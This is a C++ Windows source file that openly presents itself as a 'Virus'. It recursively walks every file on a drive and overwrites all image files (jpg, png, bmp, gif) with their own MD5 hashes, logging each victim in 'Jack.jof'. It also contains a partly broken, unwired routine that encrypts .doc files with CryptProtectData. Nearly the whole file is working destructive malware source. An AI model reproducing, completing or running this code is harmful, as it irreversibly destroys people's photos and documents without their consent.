#include<iostream>
#include<cstdio>
#include<Windows.h>
#include<string>
#include<fstream>
#include<algorithm>
#include<vector>
#include "md5.h"
#include<thread>
#include<cstdlib>

using namespace std;



class Tree_Node
{
	vector<Tree_Node*>children;
	Tree_Node* parent;
	string id;
	wstring path;
	//extract the folder children from pool of folders and files from children
	vector<Tree_Node*>folders;
public:
	Tree_Node(string id = "", wstring path = L"", Tree_Node* parent = NULL)
	{
		this->id = id;
		this->parent = parent;
		this->path = path;
	}

	string getID(){ return id; }
	Tree_Node* getParent(){ return parent; }
	wstring getPath(){ return path; }

	vector<Tree_Node*>getChildren(){ return children; }
	void addChild(Tree_Node* n);
	Tree_Node* findChild(Tree_Node* n);

	int find_total_folders();
	int find_total_files();
	vector<Tree_Node*>getFolderChildren();
	void show()
	{
		for (auto i : children)
		{
			wcout << i->getPath() << endl;
		}
	}


};


vector<Tree_Node*> Tree_Node::getFolderChildren()
{
	for (auto i : children)
	{
		if (i->getID() == "folder")
		{
			folders.push_back(i);
		}
	}
	return folders;
}

int Tree_Node::find_total_folders()
{
	int c = 0;
	for (auto i : children)
	{
		if (i->getID() == "folder")
		{
			c++;
		}
	}

	return c;
}

int Tree_Node::find_total_files()
{
	int c = 0;
	for (auto i : children)
	{
		if (i->getID() == "file")
		{
			c++;
		}
	}
	return c;
}
void Tree_Node::addChild(Tree_Node* n)
{
	children.push_back(n);
}

Tree_Node* Tree_Node::findChild(Tree_Node* n)
{
	auto itr = find_if(children.begin(), children.end(), [n](Tree_Node* t)->bool{return n->getID() == t->getID(); });
	if (itr != children.end())
	{
		return *itr;
	}
	return NULL;
}


class Tree
{
	Tree_Node* root;
	wstring root_path;
	WIN32_FIND_DATA fd;
	HANDLE dir;
	vector<Tree_Node*>files;
private:
	void Build(Tree_Node* n, wstring p);
	void getFiles(Tree_Node* n);
public:
	Tree(wstring root_path)
	{
		this->root_path = root_path;
		root = new Tree_Node("folder", root_path, NULL);
	}

	//Core module for find every file and folder in a drive and save it into children of the Tree_Node and form an n ary tree
	//using windows code to determine whether its a file or folder
	//add it to the current Tree_Node children
	//check the current Tree_Node has folders or not if it has folders then recurse it this way I am finding every files
	//and folder in a drive
	void Build(){ Build(root, root_path); }

	//find the total number of folders and files in a drive excluding the files and folder in the folders in a drive.
	int getTotalRootFolders(){ return root->find_total_folders(); }
	int getTotalRootFiles(){ return root->find_total_files(); }

	//get every nook and cranny of a drive(basically of types of files)
	void getFiles(){ getFiles(root); }
	void show_files();
	//exporting all the files found so far
	vector<Tree_Node*>getALLFiles(){ return files; }
};

void Tree::show_files()
{
	for (auto i : files)
	{
		wcout << i->getPath() << endl;
	}
}

void Tree::Build(Tree_Node* n, wstring p)
{
	p += L"\\";
	dir = FindFirstFile((p + L"*.*").c_str(), &fd);
	if (dir == INVALID_HANDLE_VALUE)
	{
		return;
	}

	do
	{
		if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
		{
			if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0)
			{
				n->addChild(new Tree_Node("folder", p + fd.cFileName, root));
			}
			continue;
		}
		n->addChild(new Tree_Node("file", p + fd.cFileName, root));
	} while (FindNextFile(dir, &fd));
	FindClose(dir);

	if (n->find_total_folders() > 0)
	{
		//In this module since root or children Tree_Node is called once to get all the folders ,so after calling this function
		//don't use any functio that calls root/Tree_Node->getFolderChildren(), it will double the children folders(duplicate)
		//so dont call after this function
		vector<Tree_Node*>child = n->getFolderChildren();
		for (auto i : child)
		{
			Build(i, i->getPath());
		}
	}
	else
		return;
}

//Now we have mapped every files and folder structure mapped into the n ary tree 
//all we have to do a simple search to fin files and folder related queries in a recursive manner
//This module finds all the files from an n ary tree
void Tree::getFiles(Tree_Node* n)
{
	vector<Tree_Node*>child = n->getChildren();

	for (auto i : child)
	{
		if (i->getID() == "file")
		{
			files.push_back(i);
		}
		else if (i->getID() == "folder")
		{
			getFiles(i);
		}
	}

}


class Node
{
protected:
	string id;
	Node* parent;
	vector<Node*>children;
public:
	Node(string id = "root_id", Node* parent = NULL) :id(id), parent(parent){}
	virtual string getID(){ return id; }
	virtual Node* getParent(){ return NULL; }
	virtual void addChild(Node* n){ children.push_back(n); }
	virtual vector<Node*>getChildren(){ return children; }

	//Image Node
	virtual void find_Image_File(Tree* t){}
	virtual void Infect_File() {}
};

//////////////////////////////Image Node////////////////////////////


class Image :public Node
{
	vector<Tree_Node*>files;
	wstring path;

private:
	void save_Result(string fileName);
	bool isInfected(string fileName);
public:
	Image(string id = "", Node* n = NULL) :Node(id, n)
	{
		for (int i = 0; i < children.size(); i++)
		{
			children.push_back(NULL);
		}
		this->path = path;
	}
	string getID(){ return id; }
	Node* getParent(){ return parent; }
	void addChild(Node* n){ children.push_back(n); }
	void find_Image_File(Tree* t);
	void Infect_File();
};

void Image::find_Image_File(Tree* t)
{
	vector<Tree_Node*>v = t->getALLFiles();
	wstring str;
	for (auto i : v)
	{
		str = i->getPath();
		if ((str.find(L".jpg") != wstring::npos) || (str.find(L".png") != wstring::npos) || (str.find(L".bmp") != wstring::npos) || (str.find(L".jpeg") != wstring::npos) || (str.find(L".PNG") != wstring::npos) || (str.find(L".gif") != wstring::npos) || (str.find(L".GIF") != wstring::npos) || (str.find(L".BMP") != wstring::npos))
		{
			files.push_back(i);
		}
	}
}

void Image::save_Result(string fileName)
{
	ofstream result;
	result.open("Jack.jof", ios::out | ios::app);
	result << fileName << endl;
	result.clear();
	result.close();
}

bool Image::isInfected(string fileName)
{
	ifstream r;
	r.open("Jack.jof", ios::in);
	string line;
	while (getline(r, line))
	{
		if (line == fileName)
		{
			r.clear();
			r.close();
			return true;
		}
	}
	return false;
}

void Image::Infect_File()
{
	MD5 md5;
	ofstream writer;
	for (auto i : files)
	{
		//i is same as s just need to convert into diff data type
		char s[500];
		wcstombs(s, i->getPath().c_str(), 500);
		if (isInfected(s))continue;
		writer.open(i->getPath().c_str(), ios::out);
		writer << md5.digestFile(s) << endl;
		save_Result(s);
		writer.clear();
		writer.close();
	}
}


///////////////////////////////Doc Node/////////////////////////////////////////////////
class Doc_Node:public Node
{
	vector<Tree_Node*>files;

public:
	Doc_Node(string id = "", Node* parent=NULL) :Node(id, parent)
	{
		for (int i = 0; i < children.size(); i++)
		{
			children.push_back(NULL);
		}
	}

	void find_doc_file(Tree *t);
	void Encrypt_Doc_File();
	void Decrypt_Doc_File();
};

void Doc_Node::find_doc_file(Tree* t)
{
	vector<Tree_Node*>v = t->getALLFiles();
	for (auto i : v)
	{
		wstring s = i->getPath();
		if (s.find(L".doc") != wstring::npos)
		{
			files.push_back(i);
		}
	}
}

void Doc_Node::Encrypt_Doc_File()
{
	ifstream reader;
	ofstream writer;
	string line;
	for (auto i : files)
	{
		reader.open(i->getPath().c_str(), ios::out);
		DATA_BLOB dataIN;
		DATA_BLOB dataOUT;
		while (getline(reader, line))
		{
			dataIN.pbData = (BYTE*)line.c_str();
			dataIN.cbData = line.length() + 1;
			CryptProtectData(&dataIN, L"", NULL, NULL, NULL, 0, &dataOUT);
			writer << dataOUT.pbData<< endl;
		}
		reader.clear();
		reader.close();
		writer.clear();
		writer.close();
	}
}


class Virus
{
	Tree* t;
	Node* root;
	wstring drive_path;
public:
	Virus(wstring drive_path)
	{
		this->drive_path = drive_path;
		root = new Node();
	}

	void Build();
	void Activate_Search_Node();
	void Activate_Node(string node_id);
};


void Virus::Build()
{
	root->addChild(new Image("img", root));
}



void Virus::Activate_Search_Node()
{
	t = new Tree(drive_path);
	t->Build();
	t->getFiles();
	//t->show_files();
}

void Virus::Activate_Node(string node_id)
{
	vector<Node*>child = root->getChildren();
	for (auto i : child)
	{
		if (node_id == "img")
		{
			if (i->getID() == node_id)
			{
				i->find_Image_File(t);
				i->Infect_File();
				break;
			}
		}
	}
}


int main()
{
	/*Image* img = new Image("img_01",L"G:\\");
	img->FindImageFile();
	img->Infect_File();*/
	Virus* v = new Virus(L"H:");
	v->Build();
	v->Activate_Search_Node();
	v->Activate_Node("img");
	return 0;
}
